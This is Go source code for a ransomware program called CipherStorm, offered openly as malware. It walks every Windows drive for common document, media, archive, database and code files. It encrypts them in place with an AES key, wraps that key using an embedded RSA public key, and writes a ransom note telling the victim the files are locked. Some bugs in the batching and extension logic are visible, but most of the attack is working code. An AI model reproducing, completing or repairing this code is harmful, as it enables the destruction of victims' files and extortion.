package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"io"
	"io/fs"
	random "math/rand"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"time"
)

var EXT = []string{
	"doc", "docx", "odt", "pdf", "txt", "rtf", "tex", "wps", "xls", "xlsx",
	"ods", "csv", "ppt", "pptx", "odp", "jpg", "jpeg", "png", "gif", "bmp",
	"tiff", "svg", "mp3", "wav", "aac", "flac", "m4a", "mp4", "avi", "mov",
	"wmv", "mkv", "flv", "zip", "rar", "7z", "tar", "gz", "bak", "tmp",
	"old", "db", "sql", "mdb", "accdb", "html", "htm", "css", "js", "py",
	"java", "c", "cpp", "epub", "mobi", "azw", "psd", "ai", "go", "pyw",
}
var FILES = []string{}

const public_Key = `-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA5ITxibqvxk1GQ0kXAWaR
VIz45Lc/y5Fgj1HpCZ14HSWBsPgeS6qRxQtooQr7h6BBfwF40sM+xOtadTJ+MNEv
tCXRBB8OmPNPRf3HV1y9ZnGTnBCgMm/jJ1kzs1no2bEv/9QcmUWuYn/DoMfGjGQO
ilzASkyvEPn6bX/+ufJ4MtVc0FLbj+SATfvRDnSAzmLZ7yHH7UjIAJ74I0EUctJX
l2m0XATmvSVeu8Yow7hTKQ6BL1SSwi6AUEmWWPhOy27Rb62mFTH/C1n/hLfa3bVO
5S+lfpZDb+szdtcLKv9hFlgbAFfVpcQoTu/x5htPv5LJKElHFCyxB42Kmatg09CX
tUJLAZNBSxONuqE6b1hDRiTuCNZH4TD76jlmusR1pymv8zLFNEJZWwrSLEpOVptb
9Hb4B3n8InRr68squSBeeAIFKRj310LbPpZVCqpV/B39gHvNLmMSV0ZHrrCj2jF/
zfQeLJPVwAmH4qWcaKvA8NntxN9lUkoCTFRIQrs9pnhQTSl8ArXnj/WaICHC4ILK
8n++ks5AO6Iuq3+Wqrc42W0AbKLcENbm6IHXbxf4r/PELHrWa874vDOXz99Q5fa1
FgqoacrqCb2V6/cE1cH8uu4DcNFM9/ehvT1CqRmBnpP/qOW4xVAoLzbxVzj9si39
St6kW8kUefnfYuFgWq92TOMCAwEAAQ==
-----END PUBLIC KEY-----`

func rsa_encode(aes_key []byte) error {
	block, _ := pem.Decode([]byte(public_Key))
	if block == nil || block.Type != "PUBLIC KEY" {
	}

	publicKeyInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return err
	}

	publicKey, ok := publicKeyInterface.(*rsa.PublicKey)
	if !ok {
		return err
	}
	//enc aes key
	enc_aes_key, err := rsa.EncryptPKCS1v15(rand.Reader, publicKey, aes_key)
	if err != nil {
		return err
	}
	//creating file
	file := "CipherStorm_Keys.txt"
	password, err := os.Create(file)
	if err != nil {
		return err
	}
	defer password.Close()
	os.WriteFile(file, enc_aes_key, 0777)
	return nil
}

func aes_password_generator() []byte {
	chars := []string{"!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "-", "+", "="}
	for i := 65; i < 91; i++ {
		chars = append(chars, string(rune(i)))
	}
	for i := 97; i < 123; i++ {
		chars = append(chars, string(rune(i)))
	}
	for i := 0; i < 10; i++ {
		chars = append(chars, strconv.Itoa(i))
	}
	r := random.New(random.NewSource(time.Now().UnixNano()))
	var aes_gen_password string
	i := 0
	for i < 32 {
		aes_gen_password += string(chars[r.Intn(len(chars))])
		i++
	}
	return []byte(aes_gen_password)
}

func encrypt(byte_text []byte, byte_key []byte) ([]byte, error) {
	c, err := aes.NewCipher(byte_key)
	if err != nil {
		return []byte{}, err
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		return []byte{}, err
	}

	nonce := make([]byte, gcm.NonceSize())

	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return []byte{}, err
	}

	enc_byte_text := gcm.Seal(nonce, nonce, byte_text, nil)

	return enc_byte_text, nil
}

func encrypt_file(file_name string, key []byte, done chan bool) error {
	file, err := os.ReadFile(file_name)
	if err != nil {
		return err
	}

	enc_file, err := encrypt(file, key)
	if err != nil {
		return err
	}

	err = os.WriteFile(file_name, enc_file, 0777)
	if err != nil {
		return err
	}
	done <- true
	return nil
}

func traverse(drive string) error {
	err := filepath.WalkDir(drive, func(path string, d fs.DirEntry, err error) error {
		if d.IsDir() != true {
			path_ext := strings.Split(path, ".")
			if slices.Contains(EXT, path_ext[1]) {
				FILES = append(FILES, path)
			}
		}
		return nil
	})
	if err != nil {
		return err
	}
	return nil
}

func ransom(file_name string) error {
	_f, err := os.Create(file_name)
	if err != nil {
		return err
	}
	defer _f.Close()
	_ransom := `
	This is a ransomeware that crypts all the data in YOUR pc.
    All the files are crypted using a AES key and saved in the file named CipherStorm_Keys.txt .
    Deleting that file permanently crypts all your files. So i wouldn't recommend doing that.
	`
	err = os.WriteFile(file_name, []byte(_ransom), 0777)
	if err != nil {
		return err
	}
	return nil
}

func main() {

	drives := []string{"A:\\", "B:\\", "C:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\",
		"I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\",
		"S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\",
	}

	for _, drive := range drives {
		_, err := os.Stat(drive)
		if err == nil {
			traverse(drive)
		}
	}

	aes_gen_password := aes_password_generator()
	rsa_encode(aes_gen_password)

	done := make(chan bool)

	min := func(a, b int) int {
		if a > b {
			return b
		} else {
			return a
		}
	}

	for i := 0; i < len(FILES); i += 20 {
		go func(i int) {
			for _, file := range FILES[i:min(i, i+20)] {
				encrypt_file(file, aes_gen_password, done)
			}
		}(i)
	}

	for range FILES {
		<-done
	}

	ransom("Cipher-Storm.txt")
}
